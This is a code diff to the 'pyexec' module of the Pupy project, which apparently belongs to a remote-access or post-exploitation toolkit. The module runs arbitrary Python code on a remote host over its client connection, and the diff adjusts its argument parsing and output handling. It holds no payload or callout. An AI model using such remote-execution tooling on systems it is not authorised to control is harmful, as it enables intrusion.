@@ -2,6 +2,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 from pupylib.PupyModule import *
+from pupylib.PupyCompleter import *
 import StringIO
 from pupylib.utils.rpyc_utils import redirected_stdo
 
@@ -11,9 +12,8 @@ class PythonExec(PupyModule):
 	""" execute python code on a remote system """
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog='pyexec', description=self.__doc__)
-		group=self.arg_parser.add_mutually_exclusive_group(required=True)
-		group.add_argument('--file', metavar="<path>", help="execute code from .py file")
-		group.add_argument('-c','--code', metavar='<code string>', help="execute python oneliner code. ex : 'import platform;print platform.uname()'")
+		self.arg_parser.add_argument('--file', metavar="<path>", completer=path_completer, help="execute code from .py file")
+		self.arg_parser.add_argument('-c','--code', metavar='<code string>', help="execute python oneliner code. ex : 'import platform;print platform.uname()'")
 
 	def run(self, args):
 		code=""
@@ -28,12 +28,12 @@ class PythonExec(PupyModule):
 		try:
 			with redirected_stdo(self.client.conn, stdout, stderr):
 				self.client.conn.execute(code+"\n")
+		finally:
 			res=stdout.getvalue()
 			err=stderr.getvalue()
 			if err.strip():
 				err="\n"+err
 			self.rawlog(res+err)
-		finally:
 			stdout.close()
 			stderr.close()
 
